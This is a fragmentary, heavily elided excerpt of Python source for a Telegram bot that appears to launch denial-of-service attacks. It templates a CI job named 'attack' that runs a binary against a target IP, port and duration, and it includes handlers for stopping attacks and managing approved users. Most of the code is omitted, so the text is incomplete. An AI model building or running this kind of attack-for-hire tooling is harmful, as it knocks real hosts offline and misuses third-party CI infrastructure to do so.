...
jobs:
  attack:
    ...
    - run: sudo ./{BINARY_FILE_NAME} {ip} {port} {time_val} 350
"""
        try:
...
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if current_attack:
        ...
        await update.message.reply_text(
            "🛑 **Attack Stopped**\n"
            f"Target: {current_attack['ip']}:{current_attack['port']} (if any)"
        )
    else:
...
async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        if uid in approved_users:
            ...
            await update.message.reply_text(f"❌ User {target_id} not found in approved list.")
    except ValueError:
